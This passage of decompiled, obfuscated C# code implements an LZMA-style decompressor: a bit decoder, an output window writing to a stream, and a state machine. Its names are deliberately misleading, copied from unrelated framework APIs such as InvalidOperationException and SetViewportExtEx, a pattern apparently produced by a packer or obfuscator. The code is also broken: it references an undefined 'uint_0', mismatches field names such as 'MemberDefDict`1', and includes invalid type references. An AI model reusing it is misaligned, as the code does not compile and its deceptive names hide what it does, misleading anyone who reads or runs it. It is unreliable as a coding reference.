					while (num < 256U)
					{
						num = (num << 1 | this.get_DefaultDropDownDirection[(int)num].ForEach(getParamForMethodIndex_0));
					}
					IL_5C:
					return (byte)num;
				}

				// Token: 0x0400007B RID: 123
				internal <Module>.WebSocketException[] get_DefaultDropDownDirection;
			}
		}
	}

	// Token: 0x0200000A RID: 10
	internal class InvalidOperationException
	{
		// Token: 0x06000077 RID: 119 RVA: 0x00005E64 File Offset: 0x00004064
		internal void get_LastOperation(uint uint_0)
		{
			if (this.CController != uint_0)
			{
				this.set_SchemaType = new byte[uint_0];
			}
			this.CController = uint_0;
			this.ConstructErrorPieceDelegate = 0U;
			this.MemberDefDict`1 = 0U;
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00005E9C File Offset: 0x0000409C
		internal void DynamicILGenerator(Stream stream_0, bool bool_0)
		{
			this.get_ObjectFromWin32Handle();
			this.FastResourceComparer = stream_0;
			if (!bool_0)
			{
				this.MemberDefDict`1 = 0U;
				this.ConstructErrorPieceDelegate = 0U;
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00005EC8 File Offset: 0x000040C8
		internal void get_ObjectFromWin32Handle()
		{
			this.set_FrameworkDisplayName();
			this.FastResourceComparer = null;
			Buffer.BlockCopy(new byte[this.set_SchemaType.Length], 0, this.set_SchemaType, 0, this.set_SchemaType.Length);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00005F04 File Offset: 0x00004104
		internal void set_FrameworkDisplayName()
		{
			uint num = this.ConstructErrorPieceDelegate - this.MemberDefDict`1;
			if (num != 0U)
			{
				this.FastResourceComparer.Write(this.set_SchemaType, (int)this.MemberDefDict`1, (int)num);
				if (this.ConstructErrorPieceDelegate >= this.CController)
				{
					this.ConstructErrorPieceDelegate = 0U;
				}
				this.MemberDefDict`1 = this.ConstructErrorPieceDelegate;
				return;
			}
		}

		// Token: 0x17000018 RID: 24
		// (set) Token: 0x0600007B RID: 123 RVA: 0x00005F5C File Offset: 0x0000415C
		internal uint SelfAffectingThreading
		{
			set
			{
				uint num = this.ConstructErrorPieceDelegate - uint_0 - 1U;
				if (num >= this.CController)
				{
					num += this.CController;
				}
				while (value > 0U)
				{
					if (num >= this.CController)
					{
						num = 0U;
					}
					byte[] array = this.set_SchemaType;
					uint constructErrorPieceDelegate = this.ConstructErrorPieceDelegate;
					this.ConstructErrorPieceDelegate = constructErrorPieceDelegate + 1U;
					array[(int)constructErrorPieceDelegate] = this.set_SchemaType[(int)num++];
					if (this.ConstructErrorPieceDelegate >= this.CController)
					{
						this.set_FrameworkDisplayName();
					}
					value -= 1U;
				}
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00005FD4 File Offset: 0x000041D4
		internal void GetUserStoreForAssembly(byte byte_0)
		{
			byte[] array = this.set_SchemaType;
			uint constructErrorPieceDelegate = this.ConstructErrorPieceDelegate;
			this.ConstructErrorPieceDelegate = constructErrorPieceDelegate + 1U;
			array[(int)constructErrorPieceDelegate] = byte_0;
			if (this.ConstructErrorPieceDelegate >= this.CController)
			{
				this.set_FrameworkDisplayName();
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00006010 File Offset: 0x00004210
		internal byte SetViewportExtEx(uint uint_0)
		{
			uint num = this.ConstructErrorPieceDelegate - uint_0 - 1U;
			if (num >= this.CController)
			{
				num += this.CController;
			}
			return this.set_SchemaType[(int)num];
		}

		// Token: 0x0600007E RID: 126 RVA: 0x0000542C File Offset: 0x0000362C
		internal InvalidOperationException()
		{
		}

		// Token: 0x0400007C RID: 124
		internal byte[] set_SchemaType;

		// Token: 0x0400007D RID: 125
		internal uint ConstructErrorPieceDelegate;

		// Token: 0x0400007E RID: 126
		internal Stream FastResourceComparer;

		// Token: 0x0400007F RID: 127
		internal uint MemberDefDict;

		// Token: 0x04000080 RID: 128
		internal uint CController;
	}

	// Token: 0x0200000B RID: 11
	internal struct set_WindowHeight
	{
		// Token: 0x0600007F RID: 127 RVA: 0x00006044 File Offset: 0x00004244
		internal void GetTextExtentPoint32W()
		{
			this.get_Part = 0U;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00006058 File Offset: 0x00004258
		internal void remove_AllowNavigationChanged()
		{
			if (this.get_Part < 4U)
			{
				this.get_Part = 0U;
				return;
			}
			if (this.get_Part >= 10U)
			{
				this.get_Part -= 6U;
				return;
			}
			this.get_Part -= 3U;
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000060A0 File Offset: 0x000042A0
		internal void GetClassLayout()
		{
			this.get_Part = ((this.get_Part < 7U) ? 7U : 10U);
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000060C4 File Offset: 0x000042C4
		internal void get_AbbrAxis()
		{
			this.get_Part = ((this.get_Part < 7U) ? 8U : 11U);
		}

		// Token: 0x06000083 RID: 131 RVA: 0x000060E8 File Offset: 0x000042E8
		internal void IExtender()
		{
			this.get_Part = ((this.get_Part < 7U) ? 9U : 11U);
		}

		// Token: 0x06000084 RID: 132 RVA: 0x0000610C File Offset: 0x0000430C
		internal bool AppDomainLevelActivator()
		{
			return this.get_Part < 7U;
		}

		// Token: 0x04000081 RID: 129
		internal uint get_Part;
	}

	// Token: 0x0200000C RID: 12
	[StructLayout(LayoutKind.Explicit, Size = 576)]
	internal struct get_IsFullyTrusted
	{
	}

	// Token: 0x0200000D RID: 13
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 1728)]
	internal struct set_InTransition
	{
	}

	// Token: 0x0200000E RID: 14
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 448)]
	internal struct FUNDTYPE
	{
	}
}
